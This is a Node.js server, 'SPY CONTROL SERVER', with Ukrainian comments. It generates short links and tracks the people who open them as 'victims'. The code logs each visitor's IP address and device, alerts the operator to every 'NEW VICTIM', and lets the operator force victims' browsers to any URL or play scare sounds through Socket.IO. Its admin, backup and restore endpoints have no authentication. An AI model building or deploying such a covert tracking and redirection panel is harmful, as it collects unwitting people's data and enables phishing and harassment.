/**
 * SPY CONTROL SERVER v11.0 [AUTO MODE]
 * Включає: Socket.IO, File Uploads, Telegram Bot, Auto Mode Switch
 */

const express = require('express');
const app = express();

// --- 1. ГЛОБАЛЬНЕ СХОВИЩЕ ДЛЯ БОТА ---
global.botFiles = [];
global.messengerPosts = global.messengerPosts || [];

// --- ПІДКЛЮЧЕННЯ БОТА ---
try {
    require('./bot.js'); 
    require('./messanger.js')(app); // app — це твій express()
    console.log('✅ Telegram Bot, messanger linked successfully');
} catch (e) {
    console.log('⚠️ Bot file missing or error:', e.message);
}

const http = require('http').createServer(app);
const io = require('socket.io')(http);
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const AdmZip = require('adm-zip');

// --- КОНФІГУРАЦІЯ ---
const PORT = process.env.PORT || 3000;
const UPLOAD_DIR = path.join(__dirname, 'public', 'uploads');

if (!fs.existsSync(UPLOAD_DIR)) {
    console.log('📂 Creating upload directory...');
    fs.mkdirSync(UPLOAD_DIR, { recursive: true });
}

app.use(express.json());
app.use(express.static('public'));

// --- MULTER ---
const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, UPLOAD_DIR),
    filename: (req, file, cb) => {
        const ext = path.extname(file.originalname);
        const name = `${Date.now()}-${uuidv4().slice(0, 8)}${ext}`;
        cb(null, name);
    }
});
const upload = multer({ 
    storage: storage,
    limits: { fileSize: 50 * 1024 * 1024 } 
});

// --- БАЗА ДАНИХ (RAM) ---
const sessions = {};       
const activeVictims = {};  
const shortLinks = {};     

// --- ДОПОМІЖНІ ФУНКЦІЇ ---

function generateShortCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 6; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
    if (shortLinks[result]) return generateShortCode();
    return result;
}

function fileToPublicUrl(filename) {
    return `/uploads/${filename}`;
}

function addFilesToSession(sessionArr, files, type) {
    if (!files || files.length === 0) return;
    files.forEach(f => {
        sessionArr.push({
            filename: f.filename,
            url: fileToPublicUrl(f.filename),
            originalname: f.originalname,
            uploadedAt: new Date().toLocaleString('uk-UA'),
            type: type
        });
    });
}

function parseDevice(ua) {
    if (!ua) return "Unknown";
    if (ua.includes('Android')) return "📱 Android";
    if (ua.includes('iPhone')) return "🍏 iPhone";
    if (ua.includes('Windows')) return "💻 PC";
    return "📱 Device";
}

// !!! ОНОВЛЕНО: Додано autoMode !!!
function createSessionObject(req, soundUrl = '', imageUrl = '', autoMode = false) {
    const id = uuidv4();
    const shortCode = generateShortCode();
    shortLinks[shortCode] = id;

    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown').split(',')[0].trim();
    
    sessions[id] = {
        id: id,
        shortCode: shortCode,
        sound: soundUrl,
        image: imageUrl,
        autoMode: autoMode, // <--- СТАТУС АВТО-РЕЖИМУ (true/false)
        createdAt: new Date().toLocaleString('uk-UA'),
        lastActiveAt: Date.now(),
        totalVictims: 0,
        creator: {
            ip: ip,
            device: parseDevice(req.headers['user-agent'])
        },
        imagesFiles: [],
        soundsFiles: []
    };
    return sessions[id];
}

// !!! ОНОВЛЕНО: Надсилаємо статус авто-режиму жертві !!!
function broadcastUpdate(roomId) {
    const s = sessions[roomId];
    if (!s) return;

    const currentSound = (s.soundsFiles.length > 0) ? s.soundsFiles[s.soundsFiles.length - 1].url : (s.sound || '');
    const currentImage = (s.imagesFiles.length > 0) ? s.imagesFiles[s.imagesFiles.length - 1].url : (s.image || '');

    s.lastActiveAt = Date.now();
    
    io.to(roomId).emit('update-media', { 
        sound: currentSound, 
        image: currentImage,
        auto: s.autoMode // <--- ВІДПРАВЛЯЄМО true АБО false
    });
}

// --- ROUTES ---

app.get('/', (req, res) => res.redirect('/admin.html'));
// Додаємо редірект на бета-адмінку, якщо треба
app.get('/beta', (req, res) => res.redirect('/beta_admin.html'));

// 1. Створення (JSON)
app.post('/create', (req, res) => {
    try {
        // Отримуємо auto_mode з запиту
        const { sound, image, auto_mode } = req.body;
        const session = createSessionObject(req, sound, image, auto_mode);
        res.json({ id: session.id, shortUrl: session.shortCode });
    } catch (e) {
        res.status(500).json({ error: "Server error" });
    }
});

// --- СИСТЕМА BACKUP (ZIP) ---

// 1. СКАЧАТИ ВСЕ (Backup)
app.get('/backup-all', (req, res) => {
    try {
        const zip = new AdmZip();
        
        // Створюємо JSON з даними
        const dbData = JSON.stringify({
            sessions,
            shortLinks,
            botFiles: global.botFiles,
            messengerPosts: global.messengerPosts  // Додаємо пости месенджера
        }, null, 2);
        
        zip.addFile("database.json", Buffer.from(dbData, "utf8"));

        // Додаємо папку з файлами
        if (fs.existsSync(UPLOAD_DIR)) {
            zip.addLocalFolder(UPLOAD_DIR, "uploads");
        }

        const zipBuffer = zip.toBuffer();
        res.set('Content-Type', 'application/zip');
        res.set('Content-Disposition', 'attachment; filename=spy_backup.zip');
        res.send(zipBuffer);
    } catch (e) {
        res.status(500).send("Backup error: " + e.message);
    }
});

// 2. ВІДНОВИТИ ВСЕ (Restore)
app.post('/restore-all', upload.single('backup'), (req, res) => {
    if (!req.file) return res.status(400).json({ error: "No file provided" });

    try {
        const zip = new AdmZip(req.file.path);
        
        // 1. Відновлюємо базу JSON
       const dbEntry = zip.getEntry("database.json");
if (dbEntry) {
    const data = JSON.parse(dbEntry.getData().toString('utf8'));
   
    // Очищуємо старі дані
    for (let key in sessions) delete sessions[key];
    for (let key in shortLinks) delete shortLinks[key];
   
    Object.assign(sessions, data.sessions || {});
    Object.assign(shortLinks, data.shortLinks || {});
    global.botFiles = data.botFiles || [];
    global.messengerPosts = data.messengerPosts || []; // Відновлюємо пости месенджера
}
        // 2. Розпаковуємо файли в uploads
        // false - не створювати підпапку, true - перезаписувати старі
        zip.extractEntryTo("uploads/", UPLOAD_DIR, false, true);

        // Видаляємо тимчасовий завантажений файл архіву
        fs.unlinkSync(req.file.path);

        console.log("♻️ Data restored from backup!");
        res.json({ success: true });
    } catch (e) {
        console.error("Restore error:", e);
        res.status(500).json({ error: e.message });
    }
});

// 2. Створення (Upload)
app.post('/create-upload', upload.fields([{ name: 'images' }, { name: 'sounds' }]), (req, res) => {
    try {
        // FormData передає boolean як рядок, конвертуємо
        const isAuto = req.body.auto_mode === 'true';
        const session = createSessionObject(req, '', '', isAuto);
        
        if (req.files['images']) addFilesToSession(session.imagesFiles, req.files['images'], 'image');
        if (req.files['sounds']) addFilesToSession(session.soundsFiles, req.files['sounds'], 'sound');

        res.json({ id: session.id, shortUrl: session.shortCode });
    } catch (e) {
        res.status(500).json({ error: "Upload failed" });
    }
});

// 3. Оновлення сесії
app.post('/update-session/:id', (req, res) => {
    const id = req.params.id;
    if (!sessions[id]) return res.status(404).json({ error: 'Not found' });

    if (req.body.sound !== undefined) sessions[id].sound = req.body.sound;
    if (req.body.image !== undefined) sessions[id].image = req.body.image;
    
    // Оновлюємо статус тумблера
    if (req.body.auto_mode !== undefined) sessions[id].autoMode = req.body.auto_mode;

    broadcastUpdate(id);
    res.json({ success: true });
});

// 4. Завантаження файлів (картинки)
app.post('/session/:id/upload-images', upload.array('images'), (req, res) => {
    const id = req.params.id;
    if (!sessions[id]) return res.status(404).json({ error: 'Not found' });
    addFilesToSession(sessions[id].imagesFiles, req.files, 'image');
    broadcastUpdate(id);
    res.json({ success: true });
});

// 5. Завантаження файлів (звуки)
app.post('/session/:id/upload-sounds', upload.array('sounds'), (req, res) => {
    const id = req.params.id;
    if (!sessions[id]) return res.status(404).json({ error: 'Not found' });
    addFilesToSession(sessions[id].soundsFiles, req.files, 'sound');
    broadcastUpdate(id);
    res.json({ success: true });
});

// 6. Список сесій
app.get('/sessions', (req, res) => {
    const list = Object.values(sessions).map(s => {
        return {
            id: s.id,
            shortCode: s.shortCode,
            fullUrl: `${req.protocol}://${req.get('host')}/${s.shortCode}`,
            createdAt: s.createdAt,
            lastActiveAt: s.lastActiveAt,
            totalVictims: s.totalVictims,
            onlineCount: Object.values(activeVictims).filter(v => v.roomId === s.id).length,
            creator: s.creator,
            imagesFiles: s.imagesFiles,
            soundsFiles: s.soundsFiles,
            autoMode: s.autoMode // Показуємо у watch статус
        };
    }).sort((a, b) => b.lastActiveAt - a.lastActiveAt);

    res.json({ sessions: list, botFiles: global.botFiles || [] });
});

// 7. Видалення сесії
app.delete('/session/:id', (req, res) => {
    const id = req.params.id;
    if (sessions[id]) {
        [...sessions[id].imagesFiles, ...sessions[id].soundsFiles].forEach(f => {
            fs.unlink(path.join(UPLOAD_DIR, f.filename), ()=>{});
        });
        if (sessions[id].shortCode) delete shortLinks[sessions[id].shortCode];
        delete sessions[id];
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Not found' });
    }
});

// 8. Видалення файлу бота
app.delete('/bot-file/:filename', (req, res) => {
    const fname = req.params.filename;
    const idx = global.botFiles.findIndex(f => f.filename === fname);
    if (idx !== -1) {
        global.botFiles.splice(idx, 1);
        fs.unlink(path.join(UPLOAD_DIR, fname), ()=>{});
        res.json({success:true});
    } else {
        res.status(404).json({ error: 'Not found' });
    }
});

// 9. Редірект
app.get('/:shortCode', (req, res) => {
    const code = req.params.shortCode;
    if (code === 'favicon.ico' || code.includes('.')) return res.sendStatus(404);

    const sessionId = shortLinks[code];
    if (sessionId) {
        res.redirect(`/victim.html?id=${sessionId}`);
    } else {
        res.status(404).send('<h1>404 - NOT FOUND</h1>');
    }
});

// --- SOCKET.IO ---
io.on('connection', (socket) => {
    
    socket.on('join-room-admin', (roomId) => {
        socket.join(roomId);
        sendVictimListToAdmin(roomId);
    });

    socket.on('trigger-redirect', (data) => {
        io.to(data.roomId).emit('force-redirect', { url: data.url });
    });

    socket.on('trigger-scare', (roomId) => {
        io.to(roomId).emit('play-sound');
    });

    socket.on('join-room-victim', (data) => {
        const roomId = data.roomId;
        socket.join(roomId);
        
        const ip = (socket.handshake.headers['x-forwarded-for'] || socket.handshake.address).split(',')[0].trim();
        
        activeVictims[socket.id] = {
            socketId: socket.id,
            roomId: roomId,
            device: parseDevice(data.userAgent),
            ip: ip
        };

        if (sessions[roomId]) {
            sessions[roomId].totalVictims++;
            // Відправляємо контент + AUTO MODE статус
            broadcastUpdate(roomId);
        }

        sendVictimListToAdmin(roomId);
        io.to(roomId).emit('admin-alert', { msg: 'NEW VICTIM!' });
    });

    socket.on('disconnect', () => {
        const v = activeVictims[socket.id];
        if (v) {
            delete activeVictims[socket.id];
            sendVictimListToAdmin(v.roomId);
        }
    });
});

function sendVictimListToAdmin(roomId) {
    const list = Object.values(activeVictims).filter(v => v.roomId === roomId);
    io.to(roomId).emit('update-victim-list', list);
}

// --- START ---
http.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
